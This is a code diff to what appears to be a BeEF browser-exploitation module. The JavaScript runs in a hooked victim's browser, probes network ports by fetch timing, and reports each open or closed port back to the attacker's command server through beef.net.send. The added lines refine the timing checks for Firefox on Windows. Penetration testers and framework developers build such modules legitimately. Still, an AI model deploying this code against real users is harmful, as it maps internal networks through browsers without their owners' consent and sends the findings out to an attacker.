@@ -83,7 +83,7 @@ beef.execute(function() {
             .then(function(res){ 
                 // If there is a status returned then Mozilla Firefox 68.5.0esr made a successful connection HTTP based or not
                 // and or Chrome received HTTP based traffic.
-                if (res.status === 0) {
+                if (res.status === 0) {                 
                     beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open", beef.are.status_success());
                 }
             })
@@ -99,9 +99,20 @@ beef.execute(function() {
                         // A basic browser check so that we don't do timing based stuff on Firefox as it is not needed
                         var isFirefox = typeof InstallTrigger !== 'undefined';
                         if (isFirefox === true) {
+                    if (navigator.platform === 'Win32') {
+                                if ((end - start) > 600 ) {
+                                     beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.are.status_success());
+                    }
+                    else {
+                                     beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open but not HTTP", beef.are.status_success());
+                    }
+                    }
+                    else {
                             beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.are.status_success());
+                    }
                   }
                         else {
+                    // console.log('does it work')
                       // // console.log(end-start)
                       // // This is a little sketchy but the only way to tell in Chrome/Chromium if the port is open. Basically sub 11ms connection was refused
                       // // check if windows or linux
